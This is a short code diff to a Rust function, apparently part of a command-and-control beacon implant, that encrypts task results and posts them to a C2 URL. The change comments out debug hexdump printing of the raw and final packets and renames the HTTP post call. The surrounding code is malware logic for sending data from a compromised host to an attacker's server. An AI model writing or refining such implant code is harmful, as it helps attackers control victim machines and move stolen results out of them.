@@ -57,10 +57,10 @@ pub fn beacon_send_result(
     .concat();
 
     // 仅在 debug 模式下打印
-    if cfg!(debug_assertions) {
-        // 打印原始数据包
-        print_hexdump("raw_pkg", &raw_pkg);
-    }
+    // if cfg!(debug_assertions) {
+    //     // 打印原始数据包
+    //     print_hexdump("raw_pkg", &raw_pkg);
+    // }
     // 初始化 IV
     let iv = AES_IV;
 
@@ -79,13 +79,13 @@ pub fn beacon_send_result(
     .concat();
 
     // 仅在 debug 模式下打印
-    if cfg!(debug_assertions) {
-        // 打印最终的缓冲区
-        print_hexdump("buf", &buf);
-    }
+    // if cfg!(debug_assertions) {
+    //     // 打印最终的缓冲区
+    //     print_hexdump("buf", &buf);
+    // }
     // 构建 URL 并发送 POST 请求
     let url = format!("{}{}", C2_POST_URL, beacon.id);
-    strike::Strike::http_post(&url, "", "", buf)?;
+    strike::Strike::post_request(&url, "", "", buf)?;
 
     Ok(())
 }
